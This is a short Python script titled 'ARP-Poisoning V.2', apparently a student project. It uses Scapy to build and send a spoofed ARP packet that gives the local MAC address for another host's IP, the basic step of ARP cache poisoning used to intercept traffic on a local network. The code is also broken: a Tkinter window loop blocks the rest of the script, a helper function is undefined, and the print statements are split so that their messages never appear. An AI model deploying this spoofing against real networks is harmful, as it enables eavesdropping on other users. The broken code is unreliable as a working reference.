#!/usr/bin/env python
# -*- coding: utf-8 -*-

#################################################
#Auteur: Abderrahim Akarramou                   #
#Programme: ARP-Poisoning V.2                      #
#                                               #
#################################################

#####################Imports#####################

from scapy.all import *
from Tkinter import *
import os
import sys

##Creation de la fenetre graphique 

fenetre = Tk()
fenetre.geometry('600x200') 
fenetre.title('ARP_Poisoning_ESD')

Saisir_passerelle= StringVar()


fenetre.mainloop()

## identification

def chercher_mac():
    my_macs = [adressmac(i) for i in get_if_list()]
    for mac in my_macs:
        if (mac != "00:00:00:00:00:00"):
            return mac


Timeout = 2


if len(sys.argv) != 3:
    print
    "Usage: arp_poison.py 192.168.1.18 192.168.1.26"
    sys.exit(1)

my_mac = chercher_mac()
if not my_mac:
    print
    "Cant get local mac address, quitting"
    sys.exit(1)

packet = Ether() / ARP(op="who-has", hwsrc=my_mac, psrc=sys.argv[2], pdst=sys.argv[1])

sendp(packet)
